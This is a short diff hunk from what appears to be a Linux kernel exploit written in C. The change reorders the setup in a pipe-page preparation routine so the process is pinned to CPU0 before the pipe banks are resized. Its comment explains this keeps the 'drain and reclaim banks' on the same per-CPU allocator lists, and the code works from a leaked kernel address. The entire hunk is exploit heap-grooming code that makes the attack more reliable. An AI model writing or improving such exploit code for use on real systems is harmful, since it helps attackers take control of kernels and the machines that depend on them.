@@ -641,7 +641,10 @@ static uint64_t prepare_pipe_page_child(
   base = (uint64_t)leaked & ~(OSS_ORDER3_SIZE - 1);
 
   set_prepare_progress(progress, PIPE_STAGE_RESIZE_DRAIN);
-  if (!resize_pipe_bank(g_drain_pipes, OSS_PIPE_SLOTS) || !pin_cpu0()) {
+  /* kernelsnitch_bruteforce() resets the caller's affinity. Restore CPU0
+   * before the first pipe-ring allocation so the drain and reclaim banks
+   * consume pages from the same per-CPU allocator lists. */
+  if (!pin_cpu0() || !resize_pipe_bank(g_drain_pipes, OSS_PIPE_SLOTS)) {
     base = 0;
     goto out;
   }
